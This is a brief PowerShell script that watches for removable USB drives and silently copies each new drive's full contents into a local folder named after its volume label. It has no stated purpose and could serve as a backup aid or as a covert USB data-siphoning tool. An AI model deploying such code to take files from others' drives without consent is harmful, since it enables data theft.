$copied = New-Object System.Collections.ArrayList
while ($true) {
    Start-Sleep -Seconds 1
    $usb_drives = (get-volume | where-Object {$_.DriveLetter -like "?"} | Where-Object -FilterScript {$_.DriveType -Eq "Removable"}).DriveLetter
    foreach ($usb_drive in $usb_drives) {
        $label = (get-volume | where-Object {$_.DriveLetter -eq "$usb_drive"} | Where-Object -FilterScript {$_.DriveType -Eq "Removable"}).FileSystemLabel
        if ($copied.Contains($label)) {
            Start-Sleep -Seconds 1
        }
        else {
            $copied.Add($label)
            robocopy "$usb_drive`:\" "$pwd\$label" /e
        }
    }
}